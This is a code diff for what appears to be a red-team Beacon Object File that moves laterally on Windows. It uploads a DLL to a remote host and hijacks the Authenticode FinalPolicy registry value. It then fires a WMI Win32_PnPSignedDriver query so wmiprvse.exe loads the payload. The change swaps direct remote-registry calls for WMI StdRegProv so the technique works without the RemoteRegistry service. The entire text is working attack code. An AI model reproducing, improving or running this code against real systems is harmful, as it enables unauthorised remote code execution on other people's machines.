@@ -43,13 +43,6 @@ DECLSPEC_IMPORT void*    WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
 DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap(void);
 DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 
-DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegConnectRegistryA(LPCSTR, HKEY, PHKEY);
-DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
-DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
-DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
-DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
-DECLSPEC_IMPORT LONG     WINAPI ADVAPI32$RegCloseKey(HKEY);
-
 DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
 DECLSPEC_IMPORT VOID     WINAPI OLE32$CoUninitialize(void);
 DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
@@ -161,8 +154,55 @@ static BOOL upload_dll(const char *target, const char *share, const char *dll_na
 }
 
 /* ================================================================
- * Phase 2: Remote registry — hijack FinalPolicy $DLL
+ * WMI connection helper — connect to a namespace on target
  * ================================================================ */
+static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) {
+    CLSID clsid_WbemLocator = {0x4590f811, 0x1d3a, 0x11d0,
+                                 {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
+    IID iid_IWbemLocator = {0xdc12a687, 0x737f, 0x11cf,
+                             {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
+
+    IWbemLocator *pLocator = NULL;
+    HRESULT hr = OLE32$CoCreateInstance(clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
+                                         iid_IWbemLocator, (void**)&pLocator);
+    if (FAILED(hr)) {
+        TMB_ERR("CoCreateInstance(WbemLocator) failed: 0x%08lx", hr);
+        return NULL;
+    }
+
+    wchar_t wTarget[512];
+    int i = 0;
+    wTarget[i++] = L'\\'; wTarget[i++] = L'\\';
+    for (const char *p = target; *p && i < 480; p++) wTarget[i++] = (wchar_t)*p;
+    wTarget[i++] = L'\\';
+    for (int j = 0; ns_suffix[j] && i < 510; j++) wTarget[i++] = ns_suffix[j];
+    wTarget[i] = L'\0';
+
+    BSTR bstrTarget = OLEAUT32$SysAllocString(wTarget);
+    IWbemServices *pSvc = NULL;
+    hr = pLocator->ConnectServer(bstrTarget, NULL, NULL, 0,
+                                  WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
+    OLEAUT32$SysFreeString(bstrTarget);
+    pLocator->Release();
+
+    if (FAILED(hr)) {
+        TMB_ERR("WMI ConnectServer failed: 0x%08lx", hr);
+        return NULL;
+    }
+
+    OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
+                             NULL, EOAC_NONE);
+    return pSvc;
+}
+
+/* ================================================================
+ * Phase 2: Remote registry via WMI StdRegProv
+ *
+ * Uses root/default namespace — always available, no RemoteRegistry needed.
+ * ================================================================ */
+
+#define WMI_HKLM 0x80000002
 
 typedef struct {
     char orig_dll[260];
@@ -170,84 +210,178 @@ typedef struct {
     BOOL had_orig;
 } FP_BACKUP;
 
-static BOOL hijack_finalpolicy(const char *target, const char *guid,
-                                const char *payload_path, FP_BACKUP *backup) {
-    HKEY hRemote = NULL;
-    LONG rc = ADVAPI32$RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hRemote);
-    if (rc != ERROR_SUCCESS) {
-        TMB_ERR("RegConnectRegistry failed: %ld (is RemoteRegistry running?)", rc);
-        return FALSE;
+/* Helper: call StdRegProv.GetStringValue and return the result */
+static BOOL stdreg_get_string(IWbemServices *pSvc, const char *subkey,
+                               const char *valueName, char *out, int outlen) {
+    IWbemClassObject *pClass = NULL, *pInDef = NULL, *pInst = NULL, *pOut = NULL;
+    BSTR bstrClass = OLEAUT32$SysAllocString(L"StdRegProv");
+    BSTR bstrMethod = OLEAUT32$SysAllocString(L"GetStringValue");
+    HRESULT hr;
+
+    hr = pSvc->GetObject(bstrClass, 0, NULL, &pClass, NULL);
+    if (FAILED(hr)) goto fail;
+
+    hr = pClass->GetMethod(bstrMethod, 0, &pInDef, NULL);
+    if (FAILED(hr)) goto fail;
+
+    hr = pInDef->SpawnInstance(0, &pInst);
+    if (FAILED(hr)) goto fail;
+
+    /* Set parameters: hDefKey, sSubKeyName, sValueName */
+    {
+        VARIANT v;
+        v.vt = VT_I4; v.lVal = WMI_HKLM;
+        pInst->Put(L"hDefKey", 0, &v, 0);
+
+        wchar_t wBuf[512];
+        int i = 0;
+        for (; subkey[i] && i < 511; i++) wBuf[i] = (wchar_t)subkey[i];
+        wBuf[i] = 0;
+        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
+        pInst->Put(L"sSubKeyName", 0, &v, 0);
+        OLEAUT32$SysFreeString(v.bstrVal);
+
+        i = 0;
+        for (; valueName[i] && i < 511; i++) wBuf[i] = (wchar_t)valueName[i];
+        wBuf[i] = 0;
+        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
+        pInst->Put(L"sValueName", 0, &v, 0);
+        OLEAUT32$SysFreeString(v.bstrVal);
     }
 
+    hr = pSvc->ExecMethod(bstrClass, bstrMethod, 0, NULL, pInst, &pOut, NULL);
+    if (FAILED(hr)) goto fail;
+
+    /* Read sValue from output */
+    {
+        VARIANT vResult;
+        hr = pOut->Get(L"sValue", 0, &vResult, NULL, NULL);
+        if (SUCCEEDED(hr) && vResult.vt == VT_BSTR && vResult.bstrVal) {
+            int i = 0;
+            for (; vResult.bstrVal[i] && i < outlen - 1; i++)
+                out[i] = (char)vResult.bstrVal[i];
+            out[i] = '\0';
+            OLEAUT32$SysFreeString(vResult.bstrVal);
+        } else {
+            out[0] = '\0';
+        }
+    }
+
+    if (pOut) pOut->Release();
+    if (pInst) pInst->Release();
+    if (pInDef) pInDef->Release();
+    if (pClass) pClass->Release();
+    OLEAUT32$SysFreeString(bstrClass);
+    OLEAUT32$SysFreeString(bstrMethod);
+    return out[0] != '\0';
+
+fail:
+    if (pOut) pOut->Release();
+    if (pInst) pInst->Release();
+    if (pInDef) pInDef->Release();
+    if (pClass) pClass->Release();
+    OLEAUT32$SysFreeString(bstrClass);
+    OLEAUT32$SysFreeString(bstrMethod);
+    return FALSE;
+}
+
+/* Helper: call StdRegProv.SetStringValue */
+static BOOL stdreg_set_string(IWbemServices *pSvc, const char *subkey,
+                               const char *valueName, const char *data) {
+    IWbemClassObject *pClass = NULL, *pInDef = NULL, *pInst = NULL, *pOut = NULL;
+    BSTR bstrClass = OLEAUT32$SysAllocString(L"StdRegProv");
+    BSTR bstrMethod = OLEAUT32$SysAllocString(L"SetStringValue");
+    HRESULT hr;
+
+    hr = pSvc->GetObject(bstrClass, 0, NULL, &pClass, NULL);
+    if (FAILED(hr)) goto fail;
+
+    hr = pClass->GetMethod(bstrMethod, 0, &pInDef, NULL);
+    if (FAILED(hr)) goto fail;
+
+    hr = pInDef->SpawnInstance(0, &pInst);
+    if (FAILED(hr)) goto fail;
+
+    {
+        VARIANT v;
+        wchar_t wBuf[512];
+        int i;
+
+        v.vt = VT_I4; v.lVal = WMI_HKLM;
+        pInst->Put(L"hDefKey", 0, &v, 0);
+
+        i = 0;
+        for (; subkey[i] && i < 511; i++) wBuf[i] = (wchar_t)subkey[i];
+        wBuf[i] = 0;
+        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
+        pInst->Put(L"sSubKeyName", 0, &v, 0);
+        OLEAUT32$SysFreeString(v.bstrVal);
+
+        i = 0;
+        for (; valueName[i] && i < 511; i++) wBuf[i] = (wchar_t)valueName[i];
+        wBuf[i] = 0;
+        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
+        pInst->Put(L"sValueName", 0, &v, 0);
+        OLEAUT32$SysFreeString(v.bstrVal);
+
+        i = 0;
+        for (; data[i] && i < 511; i++) wBuf[i] = (wchar_t)data[i];
+        wBuf[i] = 0;
+        v.vt = VT_BSTR; v.bstrVal = OLEAUT32$SysAllocString(wBuf);
+        pInst->Put(L"sValue", 0, &v, 0);
+        OLEAUT32$SysFreeString(v.bstrVal);
+    }
+
+    hr = pSvc->ExecMethod(bstrClass, bstrMethod, 0, NULL, pInst, &pOut, NULL);
+
+    if (pOut) pOut->Release();
+    if (pInst) pInst->Release();
+    if (pInDef) pInDef->Release();
+    if (pClass) pClass->Release();
+    OLEAUT32$SysFreeString(bstrClass);
+    OLEAUT32$SysFreeString(bstrMethod);
+    return SUCCEEDED(hr);
+
+fail:
+    if (pOut) pOut->Release();
+    if (pInst) pInst->Release();
+    if (pInDef) pInDef->Release();
+    if (pClass) pClass->Release();
+    OLEAUT32$SysFreeString(bstrClass);
+    OLEAUT32$SysFreeString(bstrMethod);
+    return FALSE;
+}
+
+static BOOL hijack_finalpolicy(IWbemServices *pSvc, const char *guid,
+                                const char *payload_path, FP_BACKUP *backup) {
     char keyPath[512];
     MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);
 
-    HKEY hKey = NULL;
-    DWORD disp = 0;
-    rc = ADVAPI32$RegCreateKeyExA(hRemote, keyPath, 0, NULL, 0,
-                                   KEY_READ | KEY_SET_VALUE, NULL, &hKey, &disp);
-    if (rc != ERROR_SUCCESS) {
-        TMB_ERR("RegCreateKeyEx failed: %ld", rc);
-        ADVAPI32$RegCloseKey(hRemote);
-        return FALSE;
-    }
-
     /* Backup original $DLL and $Function */
-    backup->had_orig = FALSE;
-    DWORD type, sz;
+    backup->had_orig = stdreg_get_string(pSvc, keyPath, "$DLL",
+                                          backup->orig_dll, sizeof(backup->orig_dll));
+    stdreg_get_string(pSvc, keyPath, "$Function",
+                       backup->orig_func, sizeof(backup->orig_func));
 
-    sz = sizeof(backup->orig_dll);
-    if (ADVAPI32$RegQueryValueExA(hKey, "$DLL", NULL, &type,
-                                   (BYTE*)backup->orig_dll, &sz) == ERROR_SUCCESS) {
-        backup->had_orig = TRUE;
-    }
-    sz = sizeof(backup->orig_func);
-    ADVAPI32$RegQueryValueExA(hKey, "$Function", NULL, &type,
-                               (BYTE*)backup->orig_func, &sz);
-
-    /* Write hijack: $DLL = payload path */
-    rc = ADVAPI32$RegSetValueExA(hKey, "$DLL", 0, REG_SZ,
-                                  (const BYTE*)payload_path,
-                                  (DWORD)MSVCRT$strlen(payload_path) + 1);
-    if (rc != ERROR_SUCCESS) {
-        TMB_ERR("RegSetValueEx $DLL failed: %ld", rc);
-        ADVAPI32$RegCloseKey(hKey);
-        ADVAPI32$RegCloseKey(hRemote);
+    /* Write hijack */
+    if (!stdreg_set_string(pSvc, keyPath, "$DLL", payload_path)) {
+        TMB_ERR("StdRegProv.SetStringValue $DLL failed");
         return FALSE;
     }
-
-    /* $Function = SoftpubAuthenticode (matches our payload export) */
-    const char *func = "SoftpubAuthenticode";
-    ADVAPI32$RegSetValueExA(hKey, "$Function", 0, REG_SZ,
-                             (const BYTE*)func, (DWORD)MSVCRT$strlen(func) + 1);
-
-    ADVAPI32$RegCloseKey(hKey);
-    ADVAPI32$RegCloseKey(hRemote);
+    stdreg_set_string(pSvc, keyPath, "$Function", "SoftpubAuthenticode");
 
     TMB_INFO("FinalPolicy hijacked: $DLL -> %s", payload_path);
     return TRUE;
 }
 
-static void restore_finalpolicy(const char *target, const char *guid, FP_BACKUP *backup) {
+static void restore_finalpolicy(IWbemServices *pSvc, const char *guid, FP_BACKUP *backup) {
     if (!backup->had_orig) return;
-
-    HKEY hRemote = NULL;
-    if (ADVAPI32$RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hRemote) != ERROR_SUCCESS) return;
 
     char keyPath[512];
     MSVCRT$_snprintf(keyPath, sizeof(keyPath), "%s%s", FP_KEY_PREFIX, guid);
 
-    HKEY hKey = NULL;
-    if (ADVAPI32$RegOpenKeyExA(hRemote, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        ADVAPI32$RegSetValueExA(hKey, "$DLL", 0, REG_SZ,
-                                 (const BYTE*)backup->orig_dll,
-                                 (DWORD)MSVCRT$strlen(backup->orig_dll) + 1);
-        ADVAPI32$RegSetValueExA(hKey, "$Function", 0, REG_SZ,
-                                 (const BYTE*)backup->orig_func,
-                                 (DWORD)MSVCRT$strlen(backup->orig_func) + 1);
-        ADVAPI32$RegCloseKey(hKey);
-    }
-    ADVAPI32$RegCloseKey(hRemote);
+    stdreg_set_string(pSvc, keyPath, "$DLL", backup->orig_dll);
+    stdreg_set_string(pSvc, keyPath, "$Function", backup->orig_func);
     TMB_INFO("FinalPolicy restored");
 }
 
@@ -258,65 +392,12 @@ static void restore_finalpolicy(const char *target, const char *guid, FP_BACKUP 
  * on driver files, causing wmiprvse.exe to call WinVerifyTrust and
  * load our hijacked FinalPolicy DLL.
  * ================================================================ */
-static BOOL trigger_wmi(const char *target) {
-    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
-        TMB_ERR("CoInitializeEx failed: 0x%08lx", hr);
-        return FALSE;
-    }
-
-    /* IWbemLocator CLSID and IID */
-    CLSID clsid_WbemLocator = {0x4590f811, 0x1d3a, 0x11d0,
-                                 {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
-    IID iid_IWbemLocator = {0xdc12a687, 0x737f, 0x11cf,
-                             {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
-
-    IWbemLocator *pLocator = NULL;
-    hr = OLE32$CoCreateInstance(clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
-                                iid_IWbemLocator, (void**)&pLocator);
-    if (FAILED(hr)) {
-        TMB_ERR("CoCreateInstance(WbemLocator) failed: 0x%08lx", hr);
-        OLE32$CoUninitialize();
-        return FALSE;
-    }
-
-    /* Build connection string: \\target\ROOT\CIMV2 */
-    wchar_t wTarget[512];
-    int i = 0;
-    wTarget[i++] = L'\\'; wTarget[i++] = L'\\';
-    for (const char *p = target; *p && i < 500; p++) wTarget[i++] = (wchar_t)*p;
-    const wchar_t suffix[] = L"\\ROOT\\CIMV2";
-    for (int j = 0; suffix[j] && i < 510; j++) wTarget[i++] = suffix[j];
-    wTarget[i] = L'\0';
-
-    BSTR bstrTarget = OLEAUT32$SysAllocString(wTarget);
-
-    IWbemServices *pSvc = NULL;
-    hr = pLocator->ConnectServer(bstrTarget, NULL, NULL, 0,
-                                  WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
-    OLEAUT32$SysFreeString(bstrTarget);
-
-    if (FAILED(hr)) {
-        TMB_ERR("WMI ConnectServer failed: 0x%08lx", hr);
-        pLocator->Release();
-        OLE32$CoUninitialize();
-        return FALSE;
-    }
-
-    /* Set security on the proxy — use current token */
-    hr = OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
-                                  RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
-                                  NULL, EOAC_NONE);
-    if (FAILED(hr)) {
-        TMB_WARN("CoSetProxyBlanket: 0x%08lx (continuing)", hr);
-    }
-
-    /* Execute query that forces signature verification */
+static BOOL trigger_wmi(IWbemServices *pSvc) {
     BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
     BSTR bstrQuery = OLEAUT32$SysAllocString(L"SELECT DeviceName FROM Win32_PnPSignedDriver WHERE DeviceName IS NOT NULL");
 
     IEnumWbemClassObject *pEnum = NULL;
-    hr = pSvc->ExecQuery(bstrWQL, bstrQuery,
+    HRESULT hr = pSvc->ExecQuery(bstrWQL, bstrQuery,
                           WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                           NULL, &pEnum);
     OLEAUT32$SysFreeString(bstrWQL);
@@ -324,9 +405,6 @@ static BOOL trigger_wmi(const char *target) {
 
     if (FAILED(hr)) {
         TMB_ERR("ExecQuery failed: 0x%08lx", hr);
-        pSvc->Release();
-        pLocator->Release();
-        OLE32$CoUninitialize();
         return FALSE;
     }
 
@@ -335,11 +413,7 @@ static BOOL trigger_wmi(const char *target) {
     ULONG uReturn = 0;
     hr = pEnum->Next(WBEM_INFINITE, 1, &pObj, &uReturn);
     if (pObj) pObj->Release();
-
     pEnum->Release();
-    pSvc->Release();
-    pLocator->Release();
-    OLE32$CoUninitialize();
 
     TMB_INFO("WMI trigger fired (Win32_PnPSignedDriver)");
     return TRUE;
@@ -555,31 +629,63 @@ extern "C" void go(char *args, int alen) {
         return;
     }
 
-    /* ---- Phase 2: Hijack FinalPolicy ---- */
-    FP_BACKUP backup = {0};
-    if (!hijack_finalpolicy(target, guid, target_local_path, &backup)) {
+    /* ---- Initialize COM + WMI connections ---- */
+    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
+        TMB_ERR("CoInitializeEx failed: 0x%08lx", hr);
         if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         return;
     }
 
-    /* ---- Phase 3: Trigger via WMI ---- */
-    /* Small delay for registry propagation */
+    /* Connect to root/default for StdRegProv registry operations */
+    IWbemServices *pSvcDefault = wmi_connect(target, L"ROOT\\DEFAULT");
+    if (!pSvcDefault) {
+        TMB_ERR("Failed to connect to WMI root/default on %s", target);
+        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
+        OLE32$CoUninitialize();
+        return;
+    }
+
+    /* ---- Phase 2: Hijack FinalPolicy via StdRegProv ---- */
+    FP_BACKUP backup = {0};
+    if (!hijack_finalpolicy(pSvcDefault, guid, target_local_path, &backup)) {
+        pSvcDefault->Release();
+        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
+        OLE32$CoUninitialize();
+        return;
+    }
+
+    /* ---- Phase 3: Trigger via WMI query on root/cimv2 ---- */
     KERNEL32$Sleep(500);
 
-    if (!trigger_wmi(target)) {
-        TMB_WARN("WMI trigger failed — attempting restore");
-        restore_finalpolicy(target, guid, &backup);
+    IWbemServices *pSvcCimv2 = wmi_connect(target, L"ROOT\\CIMV2");
+    if (!pSvcCimv2) {
+        TMB_WARN("Failed to connect to root/cimv2 — restoring");
+        restore_finalpolicy(pSvcDefault, guid, &backup);
+        pSvcDefault->Release();
         if (uploaded) KERNEL32$DeleteFileA(remote_unc);
+        OLE32$CoUninitialize();
         return;
     }
 
+    if (!trigger_wmi(pSvcCimv2)) {
+        TMB_WARN("WMI trigger failed — restoring");
+        restore_finalpolicy(pSvcDefault, guid, &backup);
+        pSvcCimv2->Release();
+        pSvcDefault->Release();
+        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
+        OLE32$CoUninitialize();
+        return;
+    }
+    pSvcCimv2->Release();
+
     /* ---- Phase 4: Restore registry (DLL is already loaded and pinned) ---- */
-    /* Wait for DLL to self-pin via LoadLibrary before restoring */
     KERNEL32$Sleep(2000);
 
     if (!no_cleanup) {
-        restore_finalpolicy(target, guid, &backup);
+        restore_finalpolicy(pSvcDefault, guid, &backup);
     }
+    pSvcDefault->Release();
 
     /* ---- Phase 5: Exec mode — connect to pipe ---- */
     if (mode == 1) {
@@ -595,6 +701,8 @@ extern "C" void go(char *args, int alen) {
     if (!no_cleanup && uploaded) {
         cleanup_dll(remote_unc);
     }
+
+    OLE32$CoUninitialize();
 
     if (mode == 1) {
         TMB_OK("Execution complete on %s", target);
